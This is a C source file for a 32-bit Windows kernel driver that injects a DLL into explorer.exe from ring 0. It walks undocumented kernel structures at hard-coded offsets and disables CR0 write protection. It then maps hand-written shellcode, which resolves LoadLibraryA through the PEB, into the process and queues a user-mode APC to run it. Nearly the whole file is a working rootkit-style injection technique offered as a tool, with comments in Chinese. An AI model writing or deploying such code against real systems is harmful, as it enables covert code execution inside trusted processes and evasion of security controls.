/****************************************************************************************
* Copyright (C) 2015
****************************************************************************************/
#include "APCInject(Ring0).h"

ULONG Eprocess_ActiveProcessLinks = 0x88;
ULONG Eprocess_ThreadListHead = 0x190;
ULONG Ethread_ThreadListEntry = 0x22C;
ULONG Ethread_AlertTable = 0x164;

NTSTATUS
	DriverEntry(PDRIVER_OBJECT  DriverObject,PUNICODE_STRING  RegisterPath)
{
	DriverObject->DriverUnload = UnloadDriver;

	InjectByApc("E:\\Dll.dll");

	return STATUS_SUCCESS;
}


VOID InjectByApc(IN PCHAR DllName)
{
	PEPROCESS EProcess = NULL;
	PETHREAD  EThread = NULL;
	PMDL Mdl = NULL;
	PVOID  MapAddress = NULL;
	KAPC_STATE ApcState;
	ULONG Size = 0;
	PKEVENT Event;

	Event = ExAllocatePool(NonPagedPool, sizeof(KEVENT));

	EProcess = FindEProcess("explorer.exe");

	if (EProcess == NULL)
	{
		DbgPrint("Find EProcess Fail\r\n");

		return;
	}

	EThread = FindApcThread(EProcess);
	if (EThread == NULL)
	{
		DbgPrint("Find EThread Fail\r\n");
		return;
	}

	DbgPrint("%x  %x\r\n", EProcess, EThread);

	__asm
	{
		CLI
		MOV EAX, CR0
		AND EAX, NOT 10000H
		MOV CR0, EAX
	}

	memcpy((UCHAR*)UserLoadDll_End,DllName,strlen(DllName));
	memcpy((UCHAR*)((ULONG)UserLoadDll_End + strlen(DllName)), 0, 1);

	_asm
	{
		MOV EAX, CR0
		OR EAX, 10000H
		MOV CR0, EAX
		STI
	}

	Size = (UCHAR*)UserLoadDll_End - (UCHAR*)UserLoadDll + 100;

	Mdl = IoAllocateMdl(UserLoadDll, Size, FALSE, FALSE, NULL);

	MmProbeAndLockPages(Mdl, KernelMode, IoWriteAccess);

	KeStackAttachProcess(EProcess, &ApcState);

	MapAddress = MmMapLockedPagesSpecifyCache(Mdl, UserMode, MmCached, NULL, FALSE, NormalPagePriority);

	DllName = (PCHAR)((ULONG)MapAddress + (ULONG)((UCHAR*)UserLoadDll_End - (UCHAR*)UserLoadDll));

	KeUnstackDetachProcess(&ApcState);

	KeInitializeEvent(Event, NotificationEvent, FALSE);

	InstallApc((ULONG)EProcess, (ULONG)EThread, (ULONG)MapAddress, Event, DllName);

	KeWaitForSingleObject(Event, Executive, KernelMode, FALSE, NULL);

	ExFreePool(Event);
	MmUnlockPages(Mdl);
	IoFreeMdl(Mdl);
}

PEPROCESS FindEProcess(PCHAR FindName)
{
	PCHAR ProcessName = NULL;
	PEPROCESS Current = NULL;
	PLIST_ENTRY ActiveProcessLinks = NULL;

	Current = PsGetCurrentProcess();
	while (1)
	{
		ProcessName = PsGetProcessImageFileName(Current);
		if (_stricmp(ProcessName, FindName) == 0)
		{
			return Current;
		}
		ActiveProcessLinks = (PLIST_ENTRY)((ULONG)Current + Eprocess_ActiveProcessLinks);
		Current = (PEPROCESS)(((ULONG)ActiveProcessLinks->Flink) - Eprocess_ActiveProcessLinks);
		if (Current == PsGetCurrentProcess())
		{
			break;
		}
	}

	return NULL;
}

PETHREAD FindApcThread(IN PEPROCESS EProcess)
{
	PLIST_ENTRY ThreadListHead = NULL;
	PLIST_ENTRY ThreadListEntry = NULL;
	PETHREAD CurrentThread = NULL;
	PETHREAD BeginThread = NULL;

	ThreadListHead = (PLIST_ENTRY)((ULONG)EProcess + Eprocess_ThreadListHead);
	CurrentThread = (PETHREAD)((ULONG)ThreadListHead->Flink - Ethread_ThreadListEntry);
	BeginThread = CurrentThread;

	while (1)
	{
		if (*(PBOOLEAN)((ULONG)CurrentThread + Ethread_AlertTable) == TRUE)
		{
			return CurrentThread;
		}

		ThreadListEntry = (PLIST_ENTRY)((ULONG)CurrentThread + Ethread_ThreadListEntry);
		CurrentThread = (PETHREAD)((ULONG)ThreadListEntry->Flink - Ethread_ThreadListEntry);

		if (CurrentThread == BeginThread)
		{
			break;
		}
	}

	return NULL;
}


NTSTATUS
InstallApc(ULONG	Process,
	ULONG			Thread,
	ULONG			MAppedAddress,
	PKEVENT			Event,
	PCHAR			CmdLine)
{
	NTSTATUS Status = STATUS_SUCCESS;
	PKAPC APC;
	BOOLEAN bOk;

	*((unsigned char*)Thread + 0x4A) = 1;
	APC = ExAllocatePool(NonPagedPool, sizeof(KAPC));

	KeInitializeApc(APC, (PKTHREAD)Thread, OriginalApcEnvironment,
		(PKKERNEL_ROUTINE)KernelApcRoutine, NULL, (PKNORMAL_ROUTINE)MAppedAddress,
		UserMode, (PVOID)CmdLine);

	KeInsertQueueApc(APC, Event, 0, 0);

	return STATUS_SUCCESS;
}


VOID
KernelApcRoutine(PKAPC Apc,
	PKNORMAL_ROUTINE *NormAlRoutine,
	IN OUT PVOID *NormAlContext,
	IN OUT PVOID *SystemArgument1,
	IN OUT PVOID *SystemArgument2)

{
	PKEVENT pEvent;
	pEvent = (PKEVENT)*SystemArgument1;
	KeSetEvent(pEvent, IO_NO_INCREMENT, FALSE);
	ExFreePool(Apc);
}

_declspec(naked)
void UserLoadDll_End(VOID)
{
	__asm
	{
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
		__emit 0
	}
}

__declspec(naked)
VOID
UserLoadDll(IN PCHAR DllPath,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2)
{
	__asm
	{
		//	自己去实现堆栈平衡
		push ebp;
		mov ebp, esp;
		pushad;
		jmp end;


	start:
		pop edx;		//	存放字符串的地址

						//////////////////////////////////////////////////////////////////////////

		mov eax, fs:[0x30];				//	PEB
		mov eax, [eax + 0x0C];
		/*
		0:001> .process
		Implicit process is now 7ffd9000
		0:001> dt _peb 7ffd9000
		ntdll!_PEB
		+0x000 InheritedAddressSpace : 0 ''
		+0x001 ReadImageFileExecOptions : 0 ''
		+0x002 BeingDebugged    : 0x1 ''
		+0x003 SpareBool        : 0 ''
		+0x004 Mutant           : 0xffffffff
		+0x008 ImageBaseAddress : 0x01000000
		+0x00c Ldr              : 0x001a1e90 _PEB_LDR_DATA

		*/
		mov eax, [eax + 0x1C];
		/*
		0:001> dt _PEB_LDR_DATA 0x001a1e90
		ntdll!_PEB_LDR_DATA
		+0x000 Length           : 0x28
		+0x004 Initialized      : 0x1 ''
		+0x008 SsHandle         : (null)
		+0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x1a1ec0 - 0x1a3030 ]
		+0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x1a1ec8 - 0x1a3038 ]
		+0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x1a1f28 - 0x1a3040 ]
		+0x024 EntryInProgress  : (null)


		也就是获得下一个 mov eax,[0x1a1f28]
		*/
		mov eax, [eax];
		mov eax, [eax + 0x08];


		mov ebx, eax;					//	保存着kernel32.dll的地址

										//////////////////////////////////////////////////////////////////////////

		mov esi, dword ptr[ebx + 0x3C];
		mov esi, dword ptr[ebx + esi + 0x78];	//	导出目录 RVA
		add esi, ebx;							//	导出目录
		mov edi, dword ptr[esi + 0x20];			//	AddressOfNames RVA
		add edi, ebx;							//	AddressOfNames 
		mov ecx, dword ptr[esi + 0x14];			//	NumberOfFunctions


		push ebp;                               //	保存当前堆栈              
		xor ebp, ebp;

		push esi;                               //  导出目录

	search_GetProcAddress:


		push edi;                               //	AddressOfNames 
		push ecx;                               //  将我们函数个数压入栈中保存

		mov edi, dword ptr[edi];					//	AddressOfNames[i] RVA
		add edi, ebx;							//	函数名
		mov esi, edx;							//	自己构建的"GetProcAddress"的函数地址

		mov ecx, 0xE;
		repe cmps byte ptr[esi], byte ptr[edi];
		je found;


		pop ecx;
		pop edi;
		add edi, 4;
		inc ebp;                                // 保存一个索引
		loop search_GetProcAddress;

	found:
		pop ecx;
		pop edi;
		pop esi;                                //  导出目录
		mov ecx, ebp;
		mov eax, dword ptr[esi + 0x24];			//	AddressOfNameOrdinals RVA
		add eax, ebx;							//	AddressOfNameOrdinals
		shl ecx, 1                               //  word
			add	eax, ecx
			xor	ecx, ecx
			mov	cx, word ptr[eax]					//	Index;
			mov	eax, dword ptr[esi + 1Ch]				//	AddressOfFunctions RVA
			add eax, ebx;							//	AddressOfFunctions
		shl	ecx, 2;
		add eax, ecx;
		mov	eax, dword ptr[eax];					//	函数地址 RVA
		add eax, ebx;

		pop ebp;                                //  恢复堆栈

		mov esi, edx;
		add esi, 0xF;							//	"LoadLibraryA"

		push esi;
		push ebx;                               //GetProcAddress(HMODULE,FuncName)
		call eax;

		push DllPath;
		call eax;

		popad;
		mov esp, ebp;
		pop ebp;
		ret;


	end:
		call start;
		__emit 'G'
			__emit 'e'
			__emit 't'
			__emit 'P'
			__emit 'r'
			__emit 'o'
			__emit 'c'
			__emit 'A'
			__emit 'd'
			__emit 'd'
			__emit 'r'
			__emit 'e'
			__emit 's'
			__emit 's'
			__emit 0
			__emit 'L'
			__emit 'o'
			__emit 'a'
			__emit 'd'
			__emit 'L'
			__emit 'i'
			__emit 'b'
			__emit 'r'
			__emit 'a'
			__emit 'r'
			__emit 'y'
			__emit 'A'
			__emit 0
	}
}

NTSTATUS
	DefaultPassThrough(PDEVICE_OBJECT  DeviceObject,PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp,IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

VOID
	UnloadDriver(PDRIVER_OBJECT DriverObject)
{
	DbgPrint("APCInject(Ring0) IS STOPPED!!!");
}